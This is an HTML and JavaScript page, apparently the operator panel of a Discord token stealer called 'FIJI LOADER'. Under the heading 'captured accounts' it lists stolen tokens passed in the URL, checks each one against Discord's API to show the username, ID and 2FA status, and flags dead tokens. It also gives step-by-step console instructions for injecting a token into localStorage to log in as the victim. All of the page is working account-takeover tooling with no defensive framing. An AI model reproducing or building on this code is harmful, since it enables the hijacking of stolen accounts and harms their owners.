<!doctype html>
<html lang="es"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>FIJI · login</title>
<style>
:root{--a:#5865f2;--bg:#0a0c11;--c:#12151d;--t:#e8eaf2;--m:#7d8494}
*{box-sizing:border-box}
body{margin:0;background:var(--bg);color:var(--t);
font:14px/1.5 system-ui,Segoe UI,sans-serif;padding:28px}
h1{font-size:17px;margin:0 0 4px}
p.sub{margin:0 0 22px;color:var(--m);font-size:12px}
.card{background:var(--c);border:1px solid #1d222d;border-radius:12px;
padding:16px;margin-bottom:12px}
.top{display:flex;gap:12px;align-items:center;margin-bottom:10px}
.av{width:44px;height:44px;border-radius:50%;background:#1d222d;object-fit:cover}
.name{font-weight:600}
.id{color:var(--m);font-size:11px;font-family:ui-monospace,Consolas,monospace}
.tok{width:100%;background:#0d1017;border:1px solid #1d222d;border-radius:8px;
color:#9aa0b0;font:11px/1.4 ui-monospace,Consolas,monospace;padding:8px;resize:vertical}
.row{display:flex;gap:8px;margin-top:8px}
button{flex:1;border:0;border-radius:8px;padding:9px;font-weight:600;
font-size:12px;cursor:pointer;background:#1a1e28;color:#9aa0b0}
button.p{background:var(--a);color:#fff}
button:hover{filter:brightness(1.15)}
.note{color:var(--m);font-size:11px;margin-top:18px}
code{background:#0d1017;padding:1px 5px;border-radius:4px;color:#c7cbd6}
</style></head><body>
<h1>FIJI LOADER · session</h1>
<p class="sub">Cuentas capturadas. Copia el token o abre Discord.</p>
<div id="list"></div>
<p class="note">Si el botón no inicia sesión: abre <code>discord.com/app</code>,
pulsa <code>Ctrl+Shift+I</code> → Console, pega
<code>localStorage.token=JSON.stringify("TOKEN")</code> y recarga.</p>
<script>
const base = "https://discord.com/api/v9";
const list = document.getElementById("list");
const qs = new URLSearchParams(location.search);
const many = qs.getAll("t").filter(Boolean);
const one = qs.get("t");
const toks = many.length ? many : (one ? [one] : []);
if (!toks.length) list.innerHTML =
  '<div class="card">Sin token. Usa <code>?t=TOKEN</code>.</div>';
toks.forEach((t, i) => {
  const c = document.createElement("div");
  c.className = "card";
  c.innerHTML = `<div class="top"><img class="av" alt="">
    <div><div class="name">Cuenta ${i + 1}</div>
    <div class="id">cargando…</div></div></div>
    <textarea class="tok" rows="3" readonly></textarea>
    <div class="row"><button class="cp">Copiar token</button>
    <button class="p op">Abrir Discord</button></div>`;
  const ta = c.querySelector(".tok"); ta.value = t;
  c.querySelector(".cp").onclick = () => {
    navigator.clipboard.writeText(t);
    c.querySelector(".cp").textContent = "Copiado";
    setTimeout(() => c.querySelector(".cp").textContent = "Copiar token", 1400);
  };
  c.querySelector(".op").onclick = () => {
    navigator.clipboard.writeText(t);
    window.open("https://discord.com/channels/@me", "_blank");
  };
  list.appendChild(c);
  fetch(base + "/users/@me", {headers: {Authorization: t}})
    .then(r => r.ok ? r.json() : null)
    .then(u => {
      if (!u) { c.querySelector(".id").textContent = "token muerto"; return; }
      c.querySelector(".name").textContent = u.global_name || u.username;
      c.querySelector(".id").textContent =
        u.username + " · " + u.id + (u.mfa_enabled ? " · 2fa" : "");
      if (u.avatar) c.querySelector(".av").src =
        `https://cdn.discordapp.com/avatars/${u.id}/${u.avatar}.png?size=64`;
    }).catch(() => c.querySelector(".id").textContent = "sin conexión");
});
</script></body></html>
